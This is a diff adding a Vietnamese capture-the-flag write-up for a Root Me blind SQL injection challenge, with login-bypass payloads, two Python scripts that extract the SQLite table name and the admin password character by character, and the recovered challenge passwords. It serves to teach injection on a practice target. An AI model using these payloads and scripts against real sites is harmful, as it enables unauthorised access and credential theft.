@@ -3,6 +3,7 @@
 * [1. Chết.vn](#1-chếtvn)
 * [2. Root me - SQL injection - Time based](#1-root-me---sql-injection---time-based)
 * [3. Portswigger: Blind SQL injection with time delays and information retrieval](#2-portswigger-blind-sql-injection-with-time-delays-and-information-retrieval)
+* [4. Root me - SQL injection - Blind](#4-root-me---sql-injection---blind)
 
 
 ## 1. Chết.vn
@@ -290,6 +291,87 @@ Cuối cùng là password:
 
 #### Ta cũng có được password của administrator là: rnhh118d91xe1e3raoee
 
+## 4. Root me - SQL injection - Blind
+
+Bài cho ta 1 form đăng nhập: 
+
+![image](https://user-images.githubusercontent.com/104350480/221755192-b5f75044-b415-40ef-8ca8-a4ae2574ae4e.png)
+
+Trước hết thử nhập lỗi xem sao: **a'abcd1234 --** ta được lỗi trả về với dbms là sqlite3:
+
+![image](https://user-images.githubusercontent.com/104350480/221755865-291f1ab0-0355-4ad5-b00a-f62b8c97f234.png)
+
+
+Thử payload cổ điển xem sao, **username=abcd' or 1=1 -- - &password=1**, ta được user1 trả về:
+
+![image](https://user-images.githubusercontent.com/104350480/221755354-6a35b108-1802-43f1-9392-4f276ac69150.png)
+
+Tiếp tục thử payload khác xem có users nào khác không với payload: **username=abcd' or 1=1 and username not like 'user1%' -- - &password=1**, ta được 
+username là admin trả về: 
+
+![image](https://user-images.githubusercontent.com/104350480/221755640-5e1423fe-1453-4f5c-bd64-724ec7a5a761.png)
+
+Cái ta cần là password, ta thử union kiểm tra xem có bao nhiêu cột: 
+
+![image](https://user-images.githubusercontent.com/104350480/221755942-2273371e-cbef-4604-89e5-3b9ef19ce3e6.png)
+
+Có vẻ union bị filter mất rồi, vậy là không thể dùng được union ở bài này. Ở đây ta phải dùng cách khác, thế thì mình dùng toán tử and thôi
+
+Thử substr thông thường kh được, mà dùng chr cũng báo lỗi, kh biết sao nữa, nhưng chuyển về dạng hex thì lại được:
+
+Script tìm table name:
+
+```
+import requests
+import string
+sess=requests.Session()
+url='http://challenge01.root-me.org/web-serveur/ch10/'
+payload=string.printable
+passwd=''   
+i=1
+while True:
+    for c in payload: 
+        table={
+            'username':f"user1' and (SELECT hex(substr(tbl_name,{i},1)) FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('{c}') -- -",
+            'password':'pass'
+        }
+ 
+        r=sess.post(url,data=table)
+        if "Welcome back" in r.text:
+            passwd+=c
+            i+=1
+            print(passwd)
+            break
+            
+```
+Ta được table_name là users. Tiếp tục fuzz password với username ta cần là admin: 
+
+Script:
+
+```
+import requests
+import string
+sess=requests.Session()
+url='http://challenge01.root-me.org/web-serveur/ch10/'
+payload=string.printable
+passwd=''   
+i=1
+while True:
+    for c in payload: 
+        password={
+            'username':f"admin' and substr((select password from users where (username='admin')),{i},1)='{c}'--",
+            'password':'1'
+        }
+        r=sess.post(url,data=password)
+        if "Welcome back" in r.text:
+            passwd+=c
+            i+=1
+            print(passwd)
+            break
+```
+![image](https://user-images.githubusercontent.com/104350480/221758989-00ef6ed7-d0a2-4233-94e3-335843732eef.png)
+
+> passwrod: e2azO93i
 
 
 
